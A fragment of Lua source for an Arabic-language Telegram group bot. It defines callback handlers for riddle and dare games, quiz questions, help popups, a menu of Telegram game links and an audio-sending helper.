return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/ALLL' then
local Teext =[[
• هيا نذهب داخل المنزل •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'هيا', callback_data="/Jake"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Jake' then
local Teext =[[
•  نحنو نتوه في هذه المكان •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعالي نذهب الي الضوء', callback_data="/GGGG"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/GGGG' then
local Teext =[[
• لا يوجد ضواء في هذا المكان •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ياالهي كان هناك', callback_data="/can"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/can' then
local Teext =[[
• تعالى نذهب الي الباب الرئيسي •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'انهو مغلق', callback_data="/zxz"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/zxz' then
local Teext =[[
• انها النهاية هتكمل ولا لا •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'هكمل', callback_data="/optionis"},{text = 'انسحب', callback_data="/looks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/optionis' then
local Teext =[[
• سارسل اليك  سوال مع اختيارت لو حليت صح ستنجو من العقاب لو خطأ سيقوم عليك العقاب •
السوال هوا - شيء لا يتأثر بالماء حتى عندما يمر من خلالها فمن يكون؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'السمك', callback_data="/Kelly"},{text = 'المركب', callback_data="/kalalal"},
},
{
{text = 'الضوء', callback_data="/klllag"},{text = 'الحوت', callback_data="/akakakk"},
},
{
{text = 'الخضار', callback_data="/allowj"},{text = 'الموت', callback_data="/allaly"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/klllag' then
local Teext =[[
•مبروك لقد فوزت ونجيت من العقاب•
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✅✅✅✅✅', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/allowj' then
local Teext =[[
• غلط القاب هوا-   خلاص سامحتك •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❌❌❌❌❌', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/allaly' then
local Teext =[[
• غلط القاب هوا-    سكر خشمك و قول كلمة من اختيار الاعبين الي معك•
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❌❌❌❌❌', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/akakakk' then
local Teext =[[
• غلط القاب هوا-    اذهب الى واحد ماتعرفه وقل له انا كيوت وابي بوسه •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❌❌❌❌❌', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/kalalal' then
local Teext =[[
• غلط القاب هوا-    روح المطبخ و اكسر صحن او كوب•
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❌❌❌❌❌', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Kelly' then
local Teext =[[
• غلط القاب هوا-    تتصل على الوالده  و تقول لها تزوجت با سر•
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❌❌❌❌❌', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end



if Text == '/looks' then
local Teext =[[
• انت ستندم سأقتلك •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❌❌❌❌❌', callback_data="/01ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/ahakaka' then
local Teext = [[
⍆ هل انت جهاز للعب ⍆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'حسنا', callback_data="/guitar"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/WTT' then
local Teext =[[
✖ لقد خصرت العاب من جديد ✖
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العاب مجدداً', callback_data="/ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/guitar' then
local Teext =[[
شيء لا يمشي إلا بالضرب فمن يكون؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الحمار', callback_data="/WTT"},{text = 'الكلب', callback_data="/WTT"},
},
{
{text = 'المسمار', callback_data="/Karen"},{text = 'انت', callback_data="/WTT"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Karen' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/whoa"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/whoa' then
local Teext =[[
شخص توجد قدماه في الأرض ورأسه عند النجوم فمن يكون؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الكوكب', callback_data="/WTT"},{text = 'برج خليفا', callback_data="/WTT"},
},
{
{text = 'القمر', callback_data="/WTT"},{text = 'الضابط', callback_data="/fighting"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/fighting' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/aliquots"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/aliquots' then
local Teext =[[
شيء كلما ذبحته بكيت عليه فمن هو؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الخروف', callback_data="/WTT"},{text = 'البصل', callback_data="/trait"},
},
{
{text = 'ابي', callback_data="/WTT"},{text = 'الثوم', callback_data="/WTT"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/trait' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/qqpi"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/qqpi' then
local Teext =[[
شيء يتحرك أمامك ولكن لم تشاهده فمن هو؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الجن', callback_data="/WTT"},{text = 'الفهد', callback_data="/WTT"},
},
{
{text = 'الهواء', callback_data="/duio"},{text = 'النمله', callback_data="/WTT"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/duio' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/yyuu"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/yyuu' then
local Teext =[[
شيء يوجد في الليل ثلاث مرات وفي النهار مرة واحدة فمن هو؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'النجوم', callback_data="/WTT"},{text = 'القمر', callback_data="/WTT"},
},
{
{text = 'حرف الالف', callback_data="/WTT"},{text = 'حرف اللام', callback_data="/your"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/your' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/oppp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/oppp' then
local Teext =[[
يتحرك بلا أقدام ولا يدخل إلى بالأذنين فما هو؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'منظف الاذنين', callback_data="/WTT"},{text = 'الهواء', callback_data="/WTT"},
},
{
{text = 'التراب', callback_data="/WTT"},{text = 'الصوت', callback_data="/plma"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/plma' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/qwet"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/verp' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'نسبه الذكاء 100%', callback_data="/ججج"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/pulng' then
local Teext =[[
✖ لقد خصرت  ✖
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'نسبه الذكاء 70%', callback_data="/ججج"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/pullin' then
local Teext =[[
✖ لقد خصرت  ✖
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'نسبه الذكاء 40%', callback_data="/ججج"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/plling' then
local Teext =[[
✖ لقد خصرت  ✖
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'نسبه الذكاء 0%', callback_data="/ججج"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end


if Text == '/qwet' then
local Teext =[[
يتحرك بلا أقدام ولا يدخل إلى بالأذنين فما هو؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'البوسفور', callback_data="/Zakir"},{text = 'هرمز', callback_data="/WTT"},
},
{
{text = 'ماجلان', callback_data="/WTT"},{text = 'جبل طارق', callback_data="/WTT"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/Zakir' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'سوال اخر', callback_data="/fusion"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/fusion' then
local Teext =[[
نشأ القانون الدولي....؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'في الحرب العالمية', callback_data="/WTT"},{text = 'قبل الحرب العالمية', callback_data="/WTT"},
},
{
{text = 'بعد الحرب العالمية', callback_data="/akkakak"},{text = 'في حرب فيتنام', callback_data="/WTT"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/akkakak' then
local Teext =[[
لقد كسبت مبروك ✓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'لبدا العبه من جديد', callback_data="/ahakaka"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/mute-name' then
local Teext =[[
 𖥔أنت الآن في العاب السورس ..↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'لعبه البات', callback_data="/help30"},{text = 'لعبه الرياضيات', callback_data="/help37"}},   
{{text = 'لعبه المختلف', callback_data="/help31"},{text = 'لعبه السمايلات', callback_data="/help38"}}, 
{{text = 'لعبه التخمين', callback_data="/help32"},{text = 'لعبه العكس', callback_data="/help39"}}, 
{{text = 'لعبه الاسرع', callback_data="/help33"},{text = 'لعبه الانكليزي', callback_data="/help40"}}, 
{{text = 'لعبه حزوره', callback_data="/help34"},{text = 'لعبه المعاني', callback_data="/help41"}}, 
{{text = 'لعبه الامثله', callback_data="/help35"}},
{{text = 'لعبه كشف الكذب', callback_data="/help47"}},
{{text = 'مريم', callback_data="/help36"},{text = 'عقاب', callback_data="/help42"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/help30' then
local Text = 'لتجربه العلبه عليك ان تكتب البات في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help31' then
local Text = 'لتجربه العلبه عليك ان تكتب المختلف في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help32' then
local Text = 'لتجربه العلبه عليك ان تكتب التخمين في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help33' then
local Text = 'لتجربه العلبه عليك ان تكتب الاسرع في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help34' then
local Text = 'لتجربه العلبه عليك ان تكتب الحزوه في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help35' then
local Text = 'لتجربه العلبه عليك ان تكتب امثله في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help36' then
local Text = 'لتجربه العلبه عليك ان تكتب مريم في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help37' then
local Text = 'لتجربه العلبه عليك ان تكتب الرياضيات في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help38' then
local Text = 'لتجربه العلبه عليك ان تكتب السمايلات في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help39' then
local Text = 'لتجربه العلبه عليك ان تكتب العكس في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help40' then
local Text = 'لتجربه العلبه عليك ان تكتب الانكليزي في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help41' then
local Text = 'لتجربه العلبه عليك ان تكتب المعاني في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help42' then
local Text = 'لتجربه العلبه عليك ان تكتب عقاب في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help47' then
local Text = 'لتجربه العلبه عليك ان تكتب كشف الكذب في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
function mahmoudr(chat_id, reply_to_message_id, audio, caption, markdown) 
send_api = "https://api.telegram.org/bot"..token 
local url = send_api.."/sendAudio?chat_id=" .. chat_id .. "&audio=" .. audio .."&caption=" .. URL.escape(caption) 
if reply_to_message_id ~= 0 then 
reply_to_message_id_ = reply_to_message_id
url = url .. "&reply_to_message_id=" .. reply_to_message_id_ .."&parse_mode=Markdown" 
end 
return s_api(url) 
end
if text == 'صوت' then
audio = 'هنا تحط رابط الاغنيه'
caption = 'هنا تكتب النص اللي هيظهر مع الاغنيه'
mahmoudr(msg.chat_id_, msg.id_/2097152/0.5,audio,caption)
end






if Text == '/VNO' then
local Teext =[[
 𖥔 مرحبا بيك في الالعاب  الالكترونيه ..↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/change-names' then
local Teext =[[
    「اوامر الاعضاء ⇊」  
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔   غنيلي ⇔ حساب العمر   
 𖥔   صورتي ⇔ نسبه جمالي
 𖥔   نقاطي
 𖥔    مسح ⇔ بيع 「نقاطي 」 
 𖥔   رسائلي ⇔  مسح 「رسائلي 」 
 𖥔   زخرفه ⇔ اغاني 
 𖥔   اسمي ⇔ الرتبه
 𖥔  جهاتي 
 𖥔  صلاحياتي
 𖥔  قول +الكلمه
 𖥔  تفعيل  تعطيل+ اطردني   
 𖥔   سورس ⇔ المطور
 𖥔   الرابط ⇔ ايدي
 𖥔   رتبتي ⇔ كشف
 𖥔   رد  انت يا بوت
 𖥔  ي رايك يابوت
 𖥔   هينو ⇔ هينها
 𖥔   بوسو ⇔ بوسها
 𖥔   بتحب دي ⇔ بتحب ده
 𖥔  بوت الحذف⇔رابط الحذف
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◗القائمه الرائسيه◖', callback_data="/change-id"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-id' then
local Teext =[[
 𖥔 الاوامر الاعضاء ..↑↓
 تحت لي في الزر الأسفل↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اوامر الاعضاء', callback_data="/change-names"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-photo' then
local Teext =[[
𖥔 مرحباً بك في الالعاب المضافه حديثا ..↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تويت', callback_data="/help12"},{text = 'تويت بالصور', callback_data="/help56"}},   
{{text = 'لو خيروك', callback_data="/help20"},{text = 'لو خيروك بالصور', callback_data="/help25"}}, 
{{text = 'انصحني', callback_data="/help13"},{text = 'كتبات', callback_data="/help19"}}, 
{{text = 'الصراحه', callback_data="/help14"},{text = 'حروف', callback_data="/help21"}}, 
{{text = 'اسالني', callback_data="/hakwl"},{text = 'اختبار الذكاء', callback_data="/wyauuu"}}, 
{{text = 'مستقلبي', callback_data="/whklpp"},{text = 'الابراج', callback_data="/uwujjh"}}, 
{{text = 'رزله', callback_data="/help15"},{text = 'رد عليه يابوت', callback_data="/help22"}}, 
{{text = 'بتكره دا', callback_data="/help16"},{text = 'نكته', callback_data="/help23"}}, 
{{text = 'غنيلي', callback_data="/help17"}},
{{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
